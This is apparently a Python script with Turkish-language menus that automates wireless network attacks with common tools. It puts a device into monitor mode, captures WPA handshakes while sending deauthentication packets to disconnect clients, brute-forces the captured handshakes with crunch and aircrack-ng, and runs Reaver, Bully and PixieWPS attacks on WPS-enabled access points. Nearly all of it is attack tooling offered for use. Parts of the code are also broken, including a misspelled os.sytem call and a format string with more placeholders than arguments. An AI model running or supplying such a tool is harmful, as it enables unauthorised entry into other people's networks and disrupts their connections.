import os
import subprocess
from subprocess import check_call
def intro():
    cmd  = os.system("clear")
    print("""
---------------------------------------------------------------------------------------
               __.......__
            .-:::::::::::::-.
          .:::''':::::::''':::.
        .:::'     `:::'     `:::. 
   .'\  ::'   ^^^  `:'  ^^^   '::  /`.
  :   \ ::   _.__       __._   :: /   ;
 :     \`: .' ___\     /___ `. :'/     ; 
:       /\   (_|_)\   /(_|_)   /\       ;
:      / .\   __.' ) ( `.__   /. \      ;
:      \ (        {   }        ) /      ; 
 :      `-(     .  ^"^  .     )-'      ;
  `.       \  .'<`-._.-'>'.  /       .'
    `.      \    \;`.';/    /      .'
      `._    `-._       _.-'    _.'
       .'`-.__ .'`-._.-'`. __.-'`.
     .'       `.         .'       `.
   .'           `-.   .-'           `.
---------------------------------------------------------------------------------------  
                                                                 |
-----------------------------------------------------------------|                                       
(1)monitör modu baslat                                           |
-----------------------------------------------------------------|  
(2)monitör modu kapat                                            | 
-----------------------------------------------------------------|                  
(3)ağ taramasi                                                   |
-----------------------------------------------------------------|
(4)Handshake yakala(monitör mod gerekli)                         |
-----------------------------------------------------------------|   
(5)handshake bruteforce saldirisi (Handshake,essid gerekli)      |
-----------------------------------------------------------------|                                
(6)Scan for WPS Networks                                         |
-----------------------------------------------------------------|
(7)WPS Networks saldirisi (Bssid,monitör mod gerekli)            |
-----------------------------------------------------------------|
                                                                 |
-----------------------------------------------------------------------------------------
""") 

print("\nburaya secimini gir -->>")
choice = int(input())

if choice == 1:
    print("interface seciniz -->>")
    interface = str(input(""))
    order = "airmon-ng check kill && airmon-ng start {} ".format(interface)
    geny = os.system(order)
    intro()
elif choice == 2:
    print("interface seciniz -->>")
    interface = str(input(""))
    order = "airmon-ng stop {} ".format(interface) 
    geny = os.system(order)
    intro()   
elif choice == 3:
    print("interface seciniz -->>")
    interface = str(input(""))  
    order = "airodump-ng {}".format(interface)
elif choice == 4:
  print("interface seciniz -->>")
  interface = str(input(""))
  order     = "airodump-ng {} -M".format(interface)
  print("\nişlem tamamlandiğinda CTRL + C yapin!")
  cmd = os.system("sleep 7")
  geny = os.system(order)
  print("\nhedefin bssid'sini giriniz: ")
  bssid     = str(input(""))
  print("\nhedefin kanal numarasini giriniz: ")
  channel   = int(input())
  print("cikti dosyasinin adresini giriniz: ")
  path = str(input(""))
  order = "airodump-ng {} --bssid {} -c {} -w {} | xterm -e aireplay-ng -0 {} -a {} {}".format(interface, bssid, channel, path, bssid, interface)
  geny = os.system(order)
  intro()

elif choice == 5 :
  print("\nağin essidsini gir -->")
  essid = str(input(""))
  print("\nyakalanan handshake'in bulunduğu dosyanin konumunu gir -->")
  path = str(input(""))
  print("\nminimum şifre boyutunu gir -->")
  mini = int(input(""))
  print("\nmaksimum şifre boyutunu gir -->")
  maxim  = int(input(""))
  print("""
---------------------------------------------------------------------------------------
(1)  küçük harfler                                   (abcçdefgğhıijklmnoöpqrsştuüvwxyz)
(2)  büyük harfler                                   (ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ)
(3)  rakamlar                                        (0123456789)
(4)  özel karakterler                                (!#$%/=?{}[]-*:;)
(5)  küçük harfler + büyük harfler                   (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ)
(6)  küçük harfler + rakamlar                        (abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789)
(7)  büyük harf + rakamlar                           (ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789)
(8)  özel karakter + rakamlar                        (!#$%/=?{}[]-*:;0123456789)
(9)  küçük ve büyük harf + rakamlar                  (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789) 
(10) küçük ve büyük harf + özel karakterler          (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;)
(11) küçük ve büyük harf + rakam + özel karakter     (abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;)
-----------------------------------------------------------------------------------------
""")
  print("\seçiminizi giriniz -->")
  scm = int(input(""))
  if scm == 1:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyz")    
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
    geny = os.system(order)
  elif scm == 2:
    test = str("ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ")
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 3:
    test = str("0123456789")
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 4:
    test = str("!#$%/=?{}[]-*:;")    
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
    geny = os.system(order)
  elif scm == 5:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ")  
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid)
    geny = os.system(order)
  elif scm == 6:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyz0123456789")   
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 7:
    test = str("ABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789") 
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 8:
    test = str("!#$%/=?{}[]-*:;0123456789")  
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 9:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789")  
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 10:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ!#$%/=?{}[]-*:;")  
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  elif scm == 11:
    test = str("abcçdefgğhıijklmnoöpqrsştuüvwxyzABCÇDEFGĞHIİJKLMNOÖPQRSŞTUÜVWXYZ0123456789!#$%/=?{}[]-*:;")  
    order = "crunch {} {} {} | aircrack-ng {} -e {} -w-".format(mini,maxim,test,path,essid) 
    geny = os.system(order)
  else:
    print("geçerli bir seçim giriniz") 
    intro()
  print("şifreyi kopyalayip tool'u kapatin")
  cmd5 = os.system("sleep 3d")   

elif choice == 6:
  print("interface seciniz -->>")
  interface = str(input(""))
  order = "airodump-ng -M --wps {}".format(interface)
  geny = os.system(order)
  cmd = os.system("sleep 5")
  intro()
elif choice == 7:
  cmd = os.system("clear")
  print("""
        
1)Reaver
2)Bully
3)PixieWps

0) ana menüye dön
""")  
  
  print("saldiri türünü seçiniz -->")   
  attack = int(input(""))                 
  if attack == 1:
    print("interface seciniz -->>")
    interface = str(input(""))  
    print("ağa ait bssidyi giriniz -->")
    bssid = str(input(""))
    order = ("reaver -i {} -b {} -vv").format(interface,bssid)  
    geny = os.sytem(order)
    intro()
  elif attack == 2:
    print("interface seciniz -->>")
    interface = str(input(""))  
    print("ağa ait bssidyi giriniz -->")
    bssid = str(input(""))
    print("ağa ait kanal numarasini giriniz -->")
    chnnl = int(input(""))
    order = ("bully -b {} -c {} --pixiewps {}").format(bssid,chnnl,interface)  
    geny = os.system(order)
    intro()
  elif attack == 3:
    print("interface seciniz -->>")
    interface = str(input(""))  
    print("ağa ait bssidyi giriniz -->")
    bssid = str(input(""))
    order = ("reaver -i {} -b {} -K").format(interface,bssid)
    geny = os.system(order)
    intro()
  elif attack == 0:
    intro()
  else:
    print("---bulunamadi lütfen başa dönün---")
    cmd = os.system("sleep 2")
    intro()
    
intro()
    
    
    
